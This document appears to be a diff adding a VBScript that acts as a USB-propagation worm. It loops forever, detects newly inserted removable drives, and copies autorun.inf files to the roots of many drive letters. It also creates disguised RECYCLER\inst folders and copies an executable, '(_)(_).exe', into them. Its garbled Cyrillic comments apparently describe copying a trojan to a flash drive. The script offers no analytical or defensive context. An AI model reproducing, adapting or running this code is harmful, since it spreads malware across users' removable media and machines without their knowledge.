@@ -1,0 +1,334 @@
+On Error Resume Next
+Set FSO = CreateObject("Scripting.FileSystemObject")
+colDrives = Split("D E F G H I J K L M N O P Q R S T U V W X Y Z")
+Set dictDrives = CreateObject("Scripting.Dictionary")
+For Each Drive In colDrives
+    Set Drv = FSO.GetDrive(Drive & ":")
+    If Err.Number Then
+        dictDrives.Add Drive & ":", False
+    Else
+        If Drv.DriveType = 1 And Drv.IsReady Then
+            dictDrives.Add Drive & ":", True
+        Else
+            dictDrives.Add Drive & ":", False
+        End If
+    End If
+    Err.Clear
+Next
+' ¡ÂÒÍÓÌÂ˜Ì˚È ˆËÍÎ
+While True
+    For Each Drive In dictDrives.Keys
+        Set Drv = FSO.GetDrive(Drive)
+        If (Err.Number) Or (Drv.IsReady = False) Or (Drv.DriveType <> 1) Then
+            Flag = False
+        Else
+            Flag = True
+        End If
+        Err.Clear
+        Current = dictDrives.Item(Drive)
+        If Current <> Flag Then
+            If Current = False And Flag = True Then
+              
+
+'=======================================-----------------------------------------------ÔÓ‰ÍÎ
+
+'œÀŒƒ»Ã ¿¬“Œ–¿Õ€
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "c:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "Q:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "W:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "W:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "E:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "R:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "T:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "Y:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "U:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "I:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "O:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "P:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "S:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "D:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "F:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "G:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "H:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "J:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "K:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "L:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "Z:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "X:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "V:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "N:\autorun.inf"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\autoran\autorun.inf", "M:\autorun.inf"
+
+
+
+
+'—Œ«ƒ¿“‹ œ¿œ » --------------------------------------------------------------------------------------------------------------------------------------------
+Set FileSystemObject = CreateObject("scripting.filesystemobject")
+
+FileSystemObject.CreateFolder "C:\RECYCLER"
+FileSystemObject.CreateFolder "Q:\RECYCLER"
+FileSystemObject.CreateFolder "W:\RECYCLER"
+FileSystemObject.CreateFolder "E:\RECYCLER"
+FileSystemObject.CreateFolder "R:\RECYCLER"
+FileSystemObject.CreateFolder "T:\RECYCLER"
+FileSystemObject.CreateFolder "Y:\RECYCLER"
+FileSystemObject.CreateFolder "U:\RECYCLER"
+FileSystemObject.CreateFolder "I:\RECYCLER"
+FileSystemObject.CreateFolder "O:\RECYCLER"
+FileSystemObject.CreateFolder "P:\RECYCLER"
+FileSystemObject.CreateFolder "S:\RECYCLER"
+FileSystemObject.CreateFolder "D:\RECYCLER"
+FileSystemObject.CreateFolder "F:\RECYCLER"
+FileSystemObject.CreateFolder "G:\RECYCLER"
+FileSystemObject.CreateFolder "H:\RECYCLER"
+FileSystemObject.CreateFolder "J:\RECYCLER"
+FileSystemObject.CreateFolder "K:\RECYCLER"
+FileSystemObject.CreateFolder "L:\RECYCLER"
+FileSystemObject.CreateFolder "Z:\RECYCLER"
+FileSystemObject.CreateFolder "X:\RECYCLER"
+FileSystemObject.CreateFolder "C:\RECYCLER"
+FileSystemObject.CreateFolder "V:\RECYCLER"
+FileSystemObject.CreateFolder "N:\RECYCLER"
+FileSystemObject.CreateFolder "M:\RECYCLER"
+
+
+Set FileSystemObject = CreateObject("scripting.filesystemobject")
+FileSystemObject.CreateFolder "C:\RECYCLER\inst"
+FileSystemObject.CreateFolder "Q:\RECYCLER\inst"
+FileSystemObject.CreateFolder "W:\RECYCLER\inst"
+FileSystemObject.CreateFolder "E:\RECYCLER\inst"
+FileSystemObject.CreateFolder "R:\RECYCLER\inst"
+FileSystemObject.CreateFolder "T:\RECYCLER\inst"
+FileSystemObject.CreateFolder "Y:\RECYCLER\inst"
+FileSystemObject.CreateFolder "U:\RECYCLER\inst"
+FileSystemObject.CreateFolder "I:\RECYCLER\inst"
+FileSystemObject.CreateFolder "O:\RECYCLER\inst"
+FileSystemObject.CreateFolder "P:\RECYCLER\inst"
+FileSystemObject.CreateFolder "S:\RECYCLER\inst"
+FileSystemObject.CreateFolder "D:\RECYCLER\inst"
+FileSystemObject.CreateFolder "F:\RECYCLER\inst"
+FileSystemObject.CreateFolder "G:\RECYCLER\inst"
+FileSystemObject.CreateFolder "H:\RECYCLER\inst"
+FileSystemObject.CreateFolder "J:\RECYCLER\inst"
+FileSystemObject.CreateFolder "K:\RECYCLER\inst"
+FileSystemObject.CreateFolder "L:\RECYCLER\inst"
+FileSystemObject.CreateFolder "Z:\RECYCLER\inst"
+FileSystemObject.CreateFolder "X:\RECYCLER\inst"
+FileSystemObject.CreateFolder "C:\RECYCLER\inst"
+FileSystemObject.CreateFolder "V:\RECYCLER\inst"
+FileSystemObject.CreateFolder "N:\RECYCLER\inst"
+FileSystemObject.CreateFolder "M:\RECYCLER\inst"
+
+'=========================================================================
+' Œœ»–”≈Ã “–Œﬂ Õ¿ ‘À≈’”
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "Q:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "W:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "E:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "R:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "T:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "Y:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "U:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "I:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "O:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "P:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "S:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "D:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "F:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "G:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "H:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "J:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "K:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "L:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "Z:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "X:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "C:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "V:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "B:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "N:\RECYCLER\inst\(_)(_).exe"
+
+Set FSO=CreateObject("Scripting.FileSystemObject") 
+FSO.CopyFile "C:\RECYCLER\inst\(_)(_).exe", "M:\RECYCLER\inst\(_)(_).exe"
+
+
+            Else
+              
+
+
+
+'”ƒ¿Àﬂ≈Ã À»ÿÕ»≈ ¿¬“Œ–¿Õ€-------------------------------------------------------------------------------------------------------------------ÓÚÍÎ
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "C:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "Q:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "W:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "E:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "R:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "T:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "Y:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "U:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "I:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "O:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "P:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "S:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "D:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "F:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "G:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "H:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "J:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "K:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "L:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "Z:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "X:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "V:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "N:\autorun.inf"
+
+set FSO=CreateObject("Scripting.FileSystemObject")
+FSO.DeleteFile "M:\autorun.inf"
+
+            End If
+            dictDrives.Item(Drive) = Flag
+        End If
+    Next
+    WScript.Sleep 1000
+Wend
